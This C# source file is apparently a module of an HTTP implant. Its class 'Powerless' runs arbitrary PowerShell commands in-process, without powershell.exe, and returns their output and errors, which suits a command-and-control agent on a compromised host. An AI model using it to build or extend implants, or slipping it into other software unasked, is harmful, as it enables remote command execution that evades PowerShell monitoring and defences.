using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Text;

namespace HTTPImplant.Modules
{
    public class Powerless
    {
        public static string Exec(string command)
        {
            StringBuilder output = new StringBuilder();
            try
            {
                using (PowerShell PowerShellInstance = PowerShell.Create())
                {
                    PowerShellInstance.AddScript(command);
                    Collection<PSObject> PSOutput = PowerShellInstance.Invoke();

                    foreach (PSObject outputItem in PSOutput)
                    {
                        if (outputItem != null)
                        {
                            // Convert the Base Object to a string and append it to the output StringBuilder
                            string line = outputItem.BaseObject.ToString();
                            output.AppendLine(line);

                            // Print the line to the console
                            Console.WriteLine(outputItem.BaseObject.ToString());
                        }
                    }

                    // Check and print non-terminating errors
                    if (PowerShellInstance.Streams.Error.Count > 0)
                    {
                        foreach (var error in PowerShellInstance.Streams.Error)
                        {
                            // Convert the error to a string and append it to the output StringBuilder
                            string errorMessage = "Non-Terminating Error: " + error.ToString();
                            output.AppendLine(errorMessage);

                            // Print the error message to the console
                            Console.WriteLine(errorMessage);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                // Handle runtime exceptions (terminating errors)
                string runtimeErrorMessage = "Runtime Exception: " + ex.Message;
                output.AppendLine(runtimeErrorMessage);

                // Print the runtime error message to the console
                Console.WriteLine(runtimeErrorMessage);
            }

            return output.ToString();
        }
    }
}
